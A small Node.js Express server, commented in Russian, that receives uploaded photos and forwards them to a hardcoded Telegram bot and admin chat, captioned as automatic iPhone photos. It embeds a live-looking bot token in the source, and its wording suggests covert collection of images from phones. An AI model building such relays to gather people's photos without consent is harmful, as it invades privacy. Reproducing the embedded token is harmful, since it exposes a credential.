const express = require('express');
const multer = require('multer'); // Для обработки файлов из POST-запроса
const axios = require('axios'); // Для отправки в Telegram
const app = express();
const upload = multer({ dest: 'uploads/' });

const BOT_TOKEN = "8561114931:AAFK3V8SUDkZ4zsY60ovUMayPJhmJgtAHno";
const ADMIN_ID = "7567154840";

// Тот самый эндпоинт site.site/upload
app.post('/upload', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded.');
        }

        // Читаем файл и отправляем в Telegram
        const fs = require('fs');
        const FormData = require('form-data');
        const form = new FormData();
        
        form.append('chat_id', ADMIN_ID);
        form.append('photo', fs.createReadStream(req.file.path));
        form.append('caption', '📸 Авто-фото с iPhone');

        const tgResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, 
            form, 
            { headers: form.getHeaders() }
        );

        // Удаляем временный файл с сервера
        fs.unlinkSync(req.file.path);

        res.status(200).send('Photo sent to Telegram!');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error sending to Telegram');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
